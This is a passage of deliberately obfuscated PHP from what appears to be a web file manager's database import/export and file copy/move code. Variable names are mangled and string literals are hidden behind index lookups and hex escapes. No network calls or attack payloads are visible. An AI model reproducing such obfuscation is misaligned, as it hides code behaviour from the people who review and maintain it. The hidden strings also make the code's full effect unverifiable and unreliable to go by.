($Æ¤‚ìÈ == $ªÏĞ¶ü—); fclose($‡ûç›Í); return $öº¸¯›; } public function sqlToDb($”‘û±ŞÑ, &$ÒŞĞ¢”) { $–Ÿ±Úº‡ =& $_SERVER[óÔë„ú]; $´ÖºƒÒ = $this->model()->db(); $Ï’ïï¿ = @fopen($”‘û±ŞÑ, $–Ÿ±Úº‡[1141]); if (!$Ï’ïï¿) { return !1; } $äñ€Áµ = 0; $·«± Ä¯ = $–Ÿ±Úº‡[12]; $çÂî‘ìÖ = array(); $ú×¾ıì = $this->dbType(); $õ Â–‡‚ = $ú×¾ıì == $–Ÿ±Úº‡[13] ? 500 : 2000; $ÍúšÈ¥¸ = basename($”‘û±ŞÑ, $–Ÿ±Úº‡[848]); $Ï¿…ç›Ì = 0; $—•´º³‘ = 4194304; while (!feof($Ï’ïï¿)) { $â…«²Ê = trim(fgets($Ï’ïï¿)); if (!$â…«²Ê) { continue; } $ë‹Èì = $this->sqlDecode($â…«²Ê, $ú×¾ıì, $ÍúšÈ¥¸); if (stripos($ë‹Èì, $–Ÿ±Úº‡[431]) === 0) { if (!$·«± Ä¯) { $·«± Ä¯ = $ë‹Èì . $–Ÿ±Úº‡[53]; } continue; } if ($ÒŞĞ¢”) { $ÒŞĞ¢”->task[$–Ÿ±Úº‡[1126]] += 1; } $äñ€Áµ++; $çÂî‘ìÖ[] = rtrim(rtrim(trim($ë‹Èì), $–Ÿ±Úº‡[50]), $–Ÿ±Úº‡[74]); $µìüª¯Ú = null; $ĞíÏ£œ® = strlen($ë‹Èì); $Ï¿…ç›Ì += $ĞíÏ£œ®; $Ù£·–Á… = strlen($·«± Ä¯) + $Ï¿…ç›Ì + (count($çÂî‘ìÖ) - 1); if ($Ù£·–Á… >= $—•´º³‘) { $µìüª¯Ú = array_pop($çÂî‘ìÖ); if ($äñ€Áµ > 1) { $äñ€Áµ--; } } if ($äñ€Áµ >= $õ Â–‡‚ || $µìüª¯Ú) { $ë‹Èì = $·«± Ä¯ . implode($–Ÿ±Úº‡[50], $çÂî‘ìÖ); if (!$´ÖºƒÒ->execute($ë‹Èì)) { return !1; } if ($ÒŞĞ¢”) { $ÒŞĞ¢”->update($äñ€Áµ); } $çÂî‘ìÖ = array(); $äñ€Áµ = 0; $Ï¿…ç›Ì = 0; if ($µìüª¯Ú) { $çÂî‘ìÖ = array($µìüª¯Ú); $äñ€Áµ = 1; $Ï¿…ç›Ì = $ĞíÏ£œ®; } } } fclose($Ï’ïï¿); if (!empty($çÂî‘ìÖ)) { $ë‹Èì = $·«± Ä¯ . implode($–Ÿ±Úº‡[50], $çÂî‘ìÖ); if (!$´ÖºƒÒ->execute($ë‹Èì)) { return !1; } if ($ÒŞĞ¢”) { $ÒŞĞ¢”->update($äñ€Áµ); } } return !0; } public function dropTable($ğùË©­ = null) { $²áÊ§ÊÎ = $this->model()->db(); $ÔÉº„Ã = $ğùË©­ ? array($ğùË©­) : $²áÊ§ÊÎ->getTables(); if (!$ÔÉº„Ã) { return; } foreach ($ÔÉº„Ã as $ğùË©­) { if ($ğùË©­) { $ğùË©­ = strtolower($ğùË©­); } else { continue; } $²áÊ§ÊÎ->execute("\x64\162\x6f\x70\40\164\141\142\154\x65\40\x69\146\40\x65\x78\151\163\x74\163\x20\140{$ğùË©­}\x60"); } } private function sqlEncode($áÚ‡¹³) { $öğ®¶„› =& $_SERVER[óÔë„ú]; $ì°Ü­ÈÂ = array(); foreach ($áÚ‡¹³ as $ÎÒßÜù«) { if (is_array($ÎÒßÜù«)) { $ÎÒßÜù« = json_encode_force($ÎÒßÜù«); } $ÎÒßÜù« = addslashes($ÎÒßÜù«); $ÎÒßÜù« = str_replace(array($öğ®¶„›[1142], $öğ®¶„›[262], $öğ®¶„›[418]), array($öğ®¶„›[1143], $öğ®¶„›[1144], $öğ®¶„›[1145]), $ÎÒßÜù«); $ì°Ü­ÈÂ[] = $ÎÒßÜù«; } return $öğ®¶„›[58] . implode($öğ®¶„›[1146], $ì°Ü­ÈÂ) . $öğ®¶„›[58]; } private function sqlDecode($øÍ§ªâ, $×óúø·, $ÁŠŒ½âÙ = '') { $¹³±ã =& $_SERVER[óÔë„ú]; $øÍ§ªâ = str_replace(array($¹³±ã[1143], $¹³±ã[1144], $¹³±ã[1145]), array($¹³±ã[1142], $¹³±ã[262], $¹³±ã[418]), $øÍ§ªâ); if ($×óúø· == $¹³±ã[13]) { $øÍ§ªâ = str_ireplace($¹³±ã[1147], $¹³±ã[59], $øÍ§ªâ); $øÍ§ªâ = stripslashes($øÍ§ªâ); } return preg_replace($¹³±ã[1148], $¹³±ã[12], $øÍ§ªâ); if ($×óúø· == $¹³±ã[13]) { return $ÁŠŒ½âÙ != $¹³±ã[1149] ? stripslashes($øÍ§ªâ) : $øÍ§ªâ; } if ($ÁŠŒ½âÙ == $¹³±ã[1149]) { $øÍ§ªâ = str_replace($¹³±ã[1150], $¹³±ã[121], stripslashes($øÍ§ªâ)); } return $øÍ§ªâ; } public function getSqlFile($Àô‹º÷ö = '') { $²©òæØ€ =& $_SERVER[óÔë„ú]; $Ï»íùæ• = $this->dbType(!0); $éØ„‹œ• = CONTROLLER_DIR . "\151\x6e\x73\164\x61\154\154\x2f\144\x61\x74\x61\57{$Ï»íùæ•}\x2e\x73\x71\x6c"; $ªçÛò¾™ = file_get_contents($éØ„‹œ•); $Ñ†š·æØ = $²©òæØ€[1151] . ($Ï»íùæ• == $²©òæØ€[864] ? $²©òæØ€[1152] : $²©òæØ€[1153]) . $²©òæØ€[1154]; preg_match_all($Ñ†š·æØ, $ªçÛò¾™, $ù°ıõò•); $ÌÕ©“œ¹ = $ù°ıõò•[1]; $¾Úîñ÷ß = $this->model()->db(); $×Ï§•Æœ = $¾Úîñ÷ß->getTables(); $š…çÌßø = TEMP_FILES . $²©òæØ€[1155] . date($²©òæØ€[272]) . $²©òæØ€[8]; del_dir($š…çÌßø); mk_dir($š…çÌßø); $ÓñèÚ±Ş = $š…çÌßø . $²©òæØ€[1156]; $ğÃÑßÕë = $š…çÌßø . $²©òæØ€[1157]; $ò¥ÒÔ¡Ú = $Ï»íùæ• == $²©òæØ€[13] ? $²©òæØ€[864] : $²©òæØ€[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\141\x6c\x6c\x2f\144\x61\x74\141\x2f{$ò¥ÒÔ¡Ú}\56\163\x71\154", $š…çÌßø); @touch($š…çÌßø . $Ï»íùæ• . $²©òæØ€[848]); $‘Ù•¾ÌÑ = fopen($ÓñèÚ±Ş, $²©òæØ€[1130]); $÷ƒî» = fopen($ğÃÑßÕë, $²©òæØ€[1130]); if ($Ï»íùæ• == $²©òæØ€[13]) { $×Ï§•Æœ = array_diff($×Ï§•Æœ, array($²©òæØ€[840], $²©òæØ€[841])); $Ôß—ÆêÀ = array($²©òæØ€[1158], $²©òæØ€[1159], $²©òæØ€[1160]); fwrite($÷ƒî», implode(PHP_EOL, $Ôß—ÆêÀ) . PHP_EOL . PHP_EOL); foreach ($×Ï§•Æœ as $¨£æš¬Ò) { $æšù”Ìİ = $this->sqlFromSqlite($¨£æš¬Ò); if (!$æšù”Ìİ[$²©òæØ€[13]]) { continue; } fwrite($÷ƒî», $æšù”Ìİ[$²©òæØ€[13]] . PHP_EOL . PHP_EOL); if (!in_array($¨£æš¬Ò, $ÌÕ©“œ¹)) { fwrite($‘Ù•¾ÌÑ, $æšù”Ìİ[$²©òæØ€[864]] . PHP_EOL . PHP_EOL); } } } else { foreach ($×Ï§•Æœ as $¨£æš¬Ò) { $æšù”Ìİ = $this->sqlFromMysql($¨£æš¬Ò); if (!$æšù”Ìİ[$²©òæØ€[864]]) { continue; } fwrite($‘Ù•¾ÌÑ, $æšù”Ìİ[$²©òæØ€[864]] . PHP_EOL . PHP_EOL); if (!in_array($¨£æš¬Ò, $ÌÕ©“œ¹)) { fwrite($÷ƒî», $æšù”Ìİ[$²©òæØ€[13]] . PHP_EOL . PHP_EOL); } } } fclose($‘Ù•¾ÌÑ); fclose($÷ƒî»); $ªçÛò¾™ = array($²©òæØ€[864] => $ÓñèÚ±Ş, $²©òæØ€[13] => $ğÃÑßÕë); return $Àô‹º÷ö ? $ªçÛò¾™[$Àô‹º÷ö] : $ªçÛò¾™; } public function dbType($¼ØÁ‘Ã = false) { $šÁúÂûÎ =& $_SERVER[óÔë„ú]; $æÔÔ“Ø¶ = $¼ØÁ‘Ã ? $GLOBALS[$šÁúÂûÎ[6]][$šÁúÂûÎ[21]] : $this->database; $æÔÔ“Ø¶ = array_change_key_case($æÔÔ“Ø¶); $º­Š¿’ = $æÔÔ“Ø¶[$šÁúÂûÎ[1030]]; if ($º­Š¿’ == $šÁúÂûÎ[1027]) { $­õŒªƒú = explode($šÁúÂûÎ[4], $æÔÔ“Ø¶[$šÁúÂûÎ[1036]]); $º­Š¿’ = $­õŒªƒú[0]; } $Í¨³Õ± = array($šÁúÂûÎ[1161] => $šÁúÂûÎ[13], $šÁúÂûÎ[975] => $šÁúÂûÎ[864]); if (isset($Í¨³Õ±[$º­Š¿’])) { $º­Š¿’ = $Í¨³Õ±[$º­Š¿’]; } return $º­Š¿’; } public function sqlFromMysql($é“’ ñ‚, $¢ñ¸ÌÓÍ = '') { $Ô¸¶—ŠÎ =& $_SERVER[óÔë„ú]; $×ò® = $this->model()->db(); $Ğéãë‰ = $×ò®->query($Ô¸¶—ŠÎ[1162] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[461]); if (!$Ğéãë‰ || !$Ğéãë‰[0]) { return !1; } $ûæ¿åö• = _get($Ğéãë‰[0], $Ô¸¶—ŠÎ[1163], $Ô¸¶—ŠÎ[12]); if (!$ûæ¿åö•) { return !1; } $à¨Íáêş = "\104\x52\x4f\x50\40\x54\x41\x42\x4c\x45\x20\111\106\40\105\130\111\123\124\123\x20\140{$é“’ ñ‚}\140\x3b" . PHP_EOL . $ûæ¿åö• . $Ô¸¶—ŠÎ[74]; if ($¢ñ¸ÌÓÍ && $¢ñ¸ÌÓÍ == $Ô¸¶—ŠÎ[864]) { return $à¨Íáêş; } $ÍÎŠÒæË = array_change_key_case($GLOBALS[$Ô¸¶—ŠÎ[6]][$Ô¸¶—ŠÎ[21]]); $Ğí…ÒÊ  = $ÍÎŠÒæË[$Ô¸¶—ŠÎ[1035]]; $èúÌî‹º = $Ô¸¶—ŠÎ[1164] . $Ğí…ÒÊ  . $Ô¸¶—ŠÎ[1165] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[58]; $¹ŠÊù«ü = $Ô¸¶—ŠÎ[1166] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[963]; $ëø¡œòı = $×ò®->query($èúÌî‹º); if (empty($ëø¡œòı)) { $Øµì½ş¼ = array($Ô¸¶—ŠÎ[864] => $Ô¸¶—ŠÎ[12], $Ô¸¶—ŠÎ[13] => $Ô¸¶—ŠÎ[12]); return $¢ñ¸ÌÓÍ ? $Øµì½ş¼[$¢ñ¸ÌÓÍ] : $Øµì½ş¼; } $óÃÉô®‘ = $×ò®->query($¹ŠÊù«ü); $ìùæÙ“È = $Ô¸¶—ŠÎ[12]; $ëâ§æõ = array(); foreach ($óÃÉô®‘ as $ïÉç ¦ê) { if (!$ìùæÙ“È && $ïÉç ¦ê[$Ô¸¶—ŠÎ[1167]] == $Ô¸¶—ŠÎ[1168]) { $ìùæÙ“È = $ïÉç ¦ê[$Ô¸¶—ŠÎ[1169]]; } if (isset($ëâ§æõ[$ïÉç ¦ê[$Ô¸¶—ŠÎ[1167]]])) { $ëâ§æõ[$ïÉç ¦ê[$Ô¸¶—ŠÎ[1167]]][$Ô¸¶—ŠÎ[1170]][] = $ïÉç ¦ê[$Ô¸¶—ŠÎ[1169]]; continue; } $ëâ§æõ[$ïÉç ¦ê[$Ô¸¶—ŠÎ[1167]]] = array($Ô¸¶—ŠÎ[1171] => $ïÉç ¦ê[$Ô¸¶—ŠÎ[1167]], $Ô¸¶—ŠÎ[1170] => array($ïÉç ¦ê[$Ô¸¶—ŠÎ[1169]]), $Ô¸¶—ŠÎ[1172] => $ïÉç ¦ê[$Ô¸¶—ŠÎ[1173]] == $Ô¸¶—ŠÎ[91] ? 0 : 1); } $Öù£õÈ = array(); foreach ($ëâ§æõ as $ïÉç ¦ê) { $§í¤ÉÒí = $ïÉç ¦ê[$Ô¸¶—ŠÎ[1171]] == $Ô¸¶—ŠÎ[1168]; $‰é»ëÊë = array($Ô¸¶—ŠÎ[1174], $ïÉç ¦ê[$Ô¸¶—ŠÎ[1172]] == $Ô¸¶—ŠÎ[91] && !$§í¤ÉÒí ? $Ô¸¶—ŠÎ[1175] : $Ô¸¶—ŠÎ[12], $Ô¸¶—ŠÎ[1176], $Ô¸¶—ŠÎ[1177] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[11] . ($§í¤ÉÒí ? $Ô¸¶—ŠÎ[1178] : $ïÉç ¦ê[$Ô¸¶—ŠÎ[1171]]) . $Ô¸¶—ŠÎ[121], $Ô¸¶—ŠÎ[1179], $Ô¸¶—ŠÎ[121] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[121], $Ô¸¶—ŠÎ[1180] . implode($Ô¸¶—ŠÎ[1181], $ïÉç ¦ê[$Ô¸¶—ŠÎ[1170]]) . $Ô¸¶—ŠÎ[1182]); $Öù£õÈ[] = implode($Ô¸¶—ŠÎ[53], $‰é»ëÊë) . $Ô¸¶—ŠÎ[74]; } $£¼ß·‘± = array(); $”Ğ’Á¯Ø = array($Ô¸¶—ŠÎ[1183] => $Ô¸¶—ŠÎ[1184], $Ô¸¶—ŠÎ[1184] => $Ô¸¶—ŠÎ[1184], $Ô¸¶—ŠÎ[364] => $Ô¸¶—ŠÎ[391], $Ô¸¶—ŠÎ[363] => $Ô¸¶—ŠÎ[391]); foreach ($ëø¡œòı as $ïÉç ¦ê) { $‰é»ëÊë = array($Ô¸¶—ŠÎ[121] . $ïÉç ¦ê[$Ô¸¶—ŠÎ[1185]] . $Ô¸¶—ŠÎ[121], isset($”Ğ’Á¯Ø[$ïÉç ¦ê[$Ô¸¶—ŠÎ[1186]]]) ? $”Ğ’Á¯Ø[$ïÉç ¦ê[$Ô¸¶—ŠÎ[1186]]] : $ïÉç ¦ê[$Ô¸¶—ŠÎ[1187]], $ïÉç ¦ê[$Ô¸¶—ŠÎ[1188]] == $Ô¸¶—ŠÎ[961] ? $Ô¸¶—ŠÎ[1189] : $Ô¸¶—ŠÎ[1190], $ïÉç ¦ê[$Ô¸¶—ŠÎ[1185]] == $ìùæÙ“È ? $Ô¸¶—ŠÎ[1191] : $Ô¸¶—ŠÎ[12], $ïÉç ¦ê[$Ô¸¶—ŠÎ[1012]] ? strtoupper(str_replace($Ô¸¶—ŠÎ[11], $Ô¸¶—ŠÎ[12], $ïÉç ¦ê[$Ô¸¶—ŠÎ[1012]])) : $Ô¸¶—ŠÎ[12]); $£¼ß·‘±[] = trim(implode($Ô¸¶—ŠÎ[53], $‰é»ëÊë)); } $¡Í·†¹¶ = array($Ô¸¶—ŠÎ[1192] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[1193], $Ô¸¶—ŠÎ[1194] . $é“’ ñ‚ . $Ô¸¶—ŠÎ[1195], implode($Ô¸¶—ŠÎ[50] . PHP_EOL, $£¼ß·‘±), $Ô¸¶—ŠÎ[1009]); $°íŠ•î = implode(PHP_EOL, array_merge($¡Í·†¹¶, $Öù£õÈ)); if ($¢ñ¸ÌÓÍ && $¢ñ¸ÌÓÍ == $Ô¸¶—ŠÎ[13]) { return $°íŠ•î; } $Øµì½ş¼ = array($Ô¸¶—ŠÎ[864] => $à¨Íáêş, $Ô¸¶—ŠÎ[13] => $°íŠ•î); return $¢ñ¸ÌÓÍ ? $Øµì½ş¼[$¢ñ¸ÌÓÍ] : $Øµì½ş¼; } public function sqlFromSqlite($’ú‚¹ğ, $µ¢èÈ = '') { $âÖ¦™È³ =& $_SERVER[óÔë„ú]; $É¤©†Ã = $this->model()->db(); $¦ãÎù˜² = "\x50\122\101\107\x4d\101\40\124\x41\x42\x4c\105\x5f\x49\116\106\x4f\x20\50\x27{$’ú‚¹ğ}\47\x29"; $µ–´šà = "\x53\105\x4c\105\103\124\40\x2a\40\x46\x52\x4f\115\x20\x73\161\x6c\x69\x74\x65\x5f\155\x61\163\x74\145\x72\x20\x57\x48\x45\122\x45\x20\164\x62\154\137\156\x61\155\x65\40\75\40\x27{$’ú‚¹ğ}\47"; $ƒ‰Ú†Úƒ = $É¤©†Ã->query($¦ãÎù˜²); if (empty($ƒ‰Ú†Úƒ)) { $¡¶ëğøû = array($âÖ¦™È³[864] => $âÖ¦™È³[12], $âÖ¦™È³[13] => $âÖ¦™È³[12]); return $µ¢èÈ ? $¡¶ëğøû[$µ¢èÈ] : $¡¶ëğøû; } $”û‹±›Ö = $É¤©†Ã->query($µ–´šà); $çÍŠó‚… = $ÊšŞ¬ÜÜ = array(); foreach ($”û‹±›Ö as $²‰»ûî) { if ($²‰»ûî[$âÖ¦™È³[33]] == $âÖ¦™È³[356]) { $çÍŠó‚…[] = $²‰»ûî[$âÖ¦™È³[1196]]; } else { $ÊšŞ¬ÜÜ[$²‰»ûî[$âÖ¦™È³[32]]] = $²‰»ûî[$âÖ¦™È³[1196]]; } } $«µ¢è¶’ = array_merge(array($âÖ¦™È³[1192] . $’ú‚¹ğ . $âÖ¦™È³[121]), $çÍŠó‚…, array_values($ÊšŞ¬ÜÜ)); $«µ¢è¶’ = implode($âÖ¦™È³[74] . PHP_EOL, $«µ¢è¶’) . $âÖ¦™È³[74]; if ($µ¢èÈ && $µ¢èÈ == $âÖ¦™È³[13]) { return $«µ¢è¶’; } $êÄË ±Ú = array(); $àôÏùŞ = array($âÖ¦™È³[1184] => $âÖ¦™È³[1197], $âÖ¦™È³[391] => $âÖ¦™È³[1198]); $˜àå · = $âÖ¦™È³[12]; foreach ($ƒ‰Ú†Úƒ as $²‰»ûî) { if ($²‰»ûî[$âÖ¦™È³[57]] == $âÖ¦™È³[91]) { $˜àå · = $²‰»ûî[$âÖ¦™È³[32]]; } $¨Ë©ÜòØ = array($âÖ¦™È³[461] . $²‰»ûî[$âÖ¦™È³[32]] . $âÖ¦™È³[461], isset($àôÏùŞ[$²‰»ûî[$âÖ¦™È³[33]]]) ? $àôÏùŞ[$²‰»ûî[$âÖ¦™È³[33]]] : $²‰»ûî[$âÖ¦™È³[33]], $²‰»ûî[$âÖ¦™È³[35]] == $âÖ¦™È³[91] ? $âÖ¦™È³[1189] : $âÖ¦™È³[1199] . $²‰»ûî[$âÖ¦™È³[56]], $²‰»ûî[$âÖ¦™È³[57]] == $âÖ¦™È³[91] ? $âÖ¦™È³[1200] : $âÖ¦™È³[12]); $êÄË ±Ú[] = trim(implode($âÖ¦™È³[53], $¨Ë©ÜòØ)); } foreach ($ÊšŞ¬ÜÜ as $Í™ú—„¨ => $€¯ûïìİ) { $ığåâÏº = str_replace($âÖ¦™È³[1201] . $’ú‚¹ğ . $âÖ¦™È³[11], $âÖ¦™È³[12], $Í™ú—„¨); $¸»ÅÀÕü = str_replace(array($âÖ¦™È³[121], $âÖ¦™È³[1020]), $âÖ¦™È³[461], substr($€¯ûïìİ, stripos($€¯ûïìİ, $âÖ¦™È³[337]))); if ($ığåâÏº == $âÖ¦™È³[1178]) { $˜²ÖØşÓ = $âÖ¦™È³[1202] . $˜àå · . $âÖ¦™È³[1203]; } else { $˜²ÖØşÓ = (stripos($ığåâÏº, $âÖ¦™È³[11]) ? $âÖ¦™È³[1204] : $âÖ¦™È³[12]) . ($âÖ¦™È³[1205] . $ığåâÏº . $âÖ¦™È³[1206] . $¸»ÅÀÕü); } $êÄË ±Ú[] = $˜²ÖØşÓ; } $åÃÊ’ÑË = array($âÖ¦™È³[1207] . $’ú‚¹ğ . $âÖ¦™È³[1208], $âÖ¦™È³[1209] . $’ú‚¹ğ . $âÖ¦™È³[1210], implode($âÖ¦™È³[50] . PHP_EOL, $êÄË ±Ú), $âÖ¦™È³[1211]); $Î·ñÎĞ– = implode(PHP_EOL, $åÃÊ’ÑË); if ($µ¢èÈ && $µ¢èÈ == $âÖ¦™È³[864]) { return $Î·ñÎĞ–; } $¡¶ëğøû = array($âÖ¦™È³[864] => $Î·ñÎĞ–, $âÖ¦™È³[13] => $«µ¢è¶’); return $µ¢èÈ ? $¡¶ëğøû[$µ¢èÈ] : $¡¶ëğøû; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($«‚ªç¶…, $‹üú¼ş‚) { $—Üœ³™À =& $_SERVER[óÔë„ú]; $ì½†—æ = $‹üú¼ş‚; $GLOBALS[$—Üœ³™À[1212]] = $—Üœ³™À[1213] . $«‚ªç¶…; Hook::trigger($—Üœ³™À[1213] . $«‚ªç¶… . $—Üœ³™À[1214], $ì½†—æ); $š„èé = self::driverMake($‹üú¼ş‚[0]); if (!$š„èé) { return !1; } if (method_exists($š„èé, $«‚ªç¶…)) { $–•ÀôÖ  = @call_user_func_array(array($š„èé, $«‚ªç¶…), $‹üú¼ş‚); } else { if (method_exists($š„èé, $—Üœ³™À[1215])) { $–•ÀôÖ  = @call_user_func_array(array($š„èé, $«‚ªç¶…), $‹üú¼ş‚); } else { if (method_exists(self, $«‚ªç¶…)) { $–•ÀôÖ  = @call_user_func_array(array(self, $«‚ªç¶…), $‹üú¼ş‚); } else { $–•ÀôÖ  = call_user_func_array(array(parent, $«‚ªç¶…), $‹üú¼ş‚); } } } Hook::trigger($—Üœ³™À[1213] . $«‚ªç¶… . $—Üœ³™À[1216], $ì½†—æ, $–•ÀôÖ ); return $–•ÀôÖ ; } public static function init($ııñ°) { return self::driverMake($ııñ°); } public static function copy($ê˜ıÈ“, $“€¥˜ÜÆ, $±¶¢İ™ = false, $—†öùû¸ = false) { return self::copyMoveStart($ê˜ıÈ“, $“€¥˜ÜÆ, $±¶¢İ™, $_SERVER[óÔë„ú][618], $—†öùû¸); } public static function move($ÍŞìí§, $™ğå“•½, $ã»ç¦ş’ = false, $ĞØ¢ñú = false) { return self::copyMoveStart($ÍŞìí§, $™ğå“•½, $ã»ç¦ş’, $_SERVER[óÔë„ú][620], $ĞØ¢ñú); } private static function copyMoveStart($–Í’ÚïŠ, $ÔçøâÈÄ, $Í‘¢­¦¯, $ÉÌğ‘“É, $³Œö­) { $ƒàš×Ñ’ =& $_SERVER[óÔë„ú]; $¾¹ş ¬Ú = array($–Í’ÚïŠ, $ÔçøâÈÄ, $Í‘¢­¦¯, $³Œö­); Hook::trigger($ƒàš×Ñ’[1213] . $ÉÌğ‘“É . $ƒàš×Ñ’[1214], $¾¹ş ¬Ú); $Ğ†şŠÕõ = self::copyMove($–Í’ÚïŠ, $ÔçøâÈÄ, $Í‘¢­¦¯, $ÉÌğ‘“É, $³Œö­); Hook::trigger($ƒàš×Ñ’[1213] . $ÉÌğ‘“É . $ƒàš×Ñ’[1216], $¾¹ş ¬Ú, $Ğ†şŠÕõ); return $Ğ†şŠÕõ; } public static function saveFile($íÚã‡ÓÑ, $¹ÊÖ¢±», $¤™ˆ‘î = true) { $µßÌö¼Ì =& $_SERVER[óÔë„ú]; $Œ…Ú„ÂÒ = self::info($¹ÊÖ¢±»); $İµåĞ™ = self::driverMake($íÚã‡ÓÑ); $ÉªŞæ³— = self::driverMake($¹ÊÖ¢±»); $Ò›…„¿ = !1; if ($ÉªŞæ³—->pathParse[$µßÌö¼Ì[1217]]) { $Ò›…„¿ = $ÉªŞæ³—; $ûòÒ°ã¥ = $ÉªŞæ³—->pathParse[$µßÌö¼Ì[1217]]; $ÉªŞæ³— = self::driverMake($ûòÒ°ã¥); } if ($İµåĞ™->pathParse[$µßÌö¼Ì[1217]]) { $°ù†×Àú = $İµåĞ™->pathParse[$µßÌö¼Ì[1217]]; $İµåĞ™ = self::driverMake($°ù†×Àú); } $Â«ÁÈ€â = $ÉªŞæ³—->pathFather($¹ÊÖ¢±»); $‰”ŞñÍ = !0; if (!$¤™ˆ‘î && self::driverIsSame($İµåĞ™, $ÉªŞæ³—)) { $‰”ŞñÍ = !1; } $ÄìõˆÙ– = self::copyFile($İµåĞ™, $íÚã‡ÓÑ, $ÉªŞæ³—, $Â«ÁÈ€â, $Œ…Ú„ÂÒ[$µßÌö¼Ì[32]], $‰”ŞñÍ); if ($Ò›…„¿) { $ÄìõˆÙ– = $Ò›…„¿->getPathOuter($ÄìõˆÙ–); } return $ÄìõˆÙ–; } private static function copyMove($Â›‰ ú, $ñ£²‰ºù, $—¸ÆÑÁ, $íäšıü·, $êÃ–ùÀ = false) { $ŞÔá„ó =& $_SERVER[óÔë„ú]; if (!$Â›‰ ú || $Â›‰ ú == $ŞÔá„ó[8] || !$ñ£²‰ºù) { return !1; } ignore_timeout(); $¾¯ï·ÖÂ = self::driverMake($Â›‰ ú); $¼¼ºè = self::driverMake($ñ£²‰ºù); $÷Óâßæ‘ = $íäšıü· == $ŞÔá„ó[620]; $“±Úî³¬ = !1; if ($¼¼ºè->pathParse[$ŞÔá„ó[1217]]) { $“±Úî³¬ = $¼¼ºè; $ñ£²‰ºù = $¼¼ºè->pathParse[$ŞÔá„ó[1217]]; $¼¼ºè = self::driverMake($ñ£²‰ºù); } if ($¾¯ï·ÖÂ->pathParse[$ŞÔá„ó[1217]]) { $Â›‰ ú = $¾¯ï·ÖÂ->pathParse[$ŞÔá„ó[1217]]; $¾¯ï·ÖÂ = self::driverMake($Â›‰ ú); } self::check($¾¯ï·ÖÂ, $Â›‰ ú, $¼¼ºè, $ñ£²‰ºù); Hook::trigger($ŞÔá„ó[1218], $¾¯ï·ÖÂ, $Â›‰ ú, $¼¼ºè, $ñ£²‰ºù); $ëšÑ»— = self::driverIsSame($¾¯ï·ÖÂ, $¼¼ºè); if ($ëšÑ»—) { if ($íäšıü· == $ŞÔá„ó[620] && !method_exists($¼¼ºè, $ŞÔá„ó[1219]) && trim($ñ£²‰ºù, $ŞÔá„ó[8]) == trim($¼¼ºè->pathFather($Â›‰ ú), $ŞÔá„ó[8])) { if ($¾¯ï·ÖÂ->pathThis($Â›‰ ú) != $êÃ–ùÀ && !$¾¯ï·ÖÂ->isOsDriver()) { return $¾¯ï·ÖÂ->rename($Â›‰ ú, $êÃ–ùÀ); } return $¼¼ºè->getPathOuter($Â›‰ ú); } if (method_exists($¼¼ºè, $íäšıü·)) { return $¼¼ºè->{$íäšıü·}($Â›‰ ú, $ñ£²‰ºù, $—¸ÆÑÁ, $êÃ–ùÀ); } } if ($ëšÑ»— && $íäšıü· == $ŞÔá„ó[620] && $¼¼ºè->getType() == $ŞÔá„ó[109]) { $ééŠà¯å = $¼¼ºè->movePath($Â›‰ ú, $ñ£²‰ºù, $êÃ–ùÀ); if ($ééŠà¯å) { return $ééŠà¯å; } } $„ÄÅ”ı = $¾¯ï·ÖÂ->isFile($Â›‰ ú); if (!$„ÄÅ”ı && $¼¼ºè->getType() == $ŞÔá„ó[817] && $¾¯ï·ÖÂ->getType() == $ŞÔá„ó[109]) { $ééŠà¯å = $¼¼ºè->copyFolderFromIO($¾¯ï·ÖÂ, $Â›‰ ú, $ñ£²‰ºù, $—¸ÆÑÁ, $÷Óâßæ‘, $êÃ–ùÀ); } else { $ééŠà¯å = self::copyPath($¾¯ï·ÖÂ, $Â›‰ ú, $¼¼ºè, $ñ£²‰ºù, $—¸ÆÑÁ, $÷Óâßæ‘, $„ÄÅ”ı, $êÃ–ùÀ); } if ($ééŠà¯å && $÷Óâßæ‘) { $¾¯ï·ÖÂ->remove($Â›‰ ú); } if ($“±Úî³¬) { $ééŠà¯å = $“±Úî³¬->getPathOuter($ééŠà¯å); } return $ééŠà¯å; } private static function check($ã¼òÚä, $Î÷ÍÂÔë, $¦âªÖà³, &$ÃİÇòáÉ) { $’ö¼ÒÓ =& $_SERVER[óÔë„ú]; if (self::driverIsSame($ã¼òÚä, $¦âªÖà³) && $ã¼òÚä->isFolder($Î÷ÍÂÔë) && $ã¼òÚä->isParentOf($Î÷ÍÂÔë, $ÃİÇòáÉ)) { show_json(LNG($’ö¼ÒÓ[1220]), !1); } if (!$ã¼òÚä->exist($Î÷ÍÂÔë)) { show_json(LNG($’ö¼ÒÓ[108]), !1); } } private static function copyPath($¥º‡ä®, $Ó±Ã¦·ˆ, $¬¿Ö›•†, $É¯®šÔ•, $ã€¶áˆ×, $ÈıÉæÙ™, $£ÂÉ¤Å, $ğˆ»âôÇ = false, $‹¬İ ¶° = true) { $Ì×Œä—” =& $_SERVER[óÔë„ú]; $É¤¦Ğ¹Ş = empty($ğˆ»âôÇ) && $ğˆ»âôÇ !== $Ì×Œä—”[228] ? $¥º‡ä®->pathThis($Ó±Ã¦·ˆ) : $ğˆ»âôÇ; if ($ã€¶áˆ×) { $Ş«ÖúÚ = $¬¿Ö›•†->fileNameExist($É¯®šÔ•, $É¤¦Ğ¹Ş); $îëíÜÒ› = $É¤¦Ğ¹Ş; $É¤¦Ğ¹Ş = $¬¿Ö›•†->fileNameAuto($É¯®šÔ•, $É¤¦Ğ¹Ş, $ã€¶áˆ×, !$£ÂÉ¤Å); if (!$Ş«ÖúÚ || $îëíÜÒ› != $É¤¦Ğ¹Ş) { $ã€¶áˆ× = !1; } if ($‹¬İ ¶° && !$ã€¶áˆ×) { $¬¿Ö›•†->_data[$Ì×Œä—”[1221]] = !0; } } if ($£ÂÉ¤Å) { return self::copyFile($¥º‡ä®, $Ó±Ã¦·ˆ, $¬¿Ö›•†, $É¯®šÔ•, $É¤¦Ğ¹Ş, $ÈıÉæÙ™); } if ($ã€¶áˆ× == REPEAT_RENAME_FOLDER) { $ã€¶áˆ× = !1; } $éóú¯ù = rtrim($É¯®šÔ•, $Ì×Œä—”[8]) . 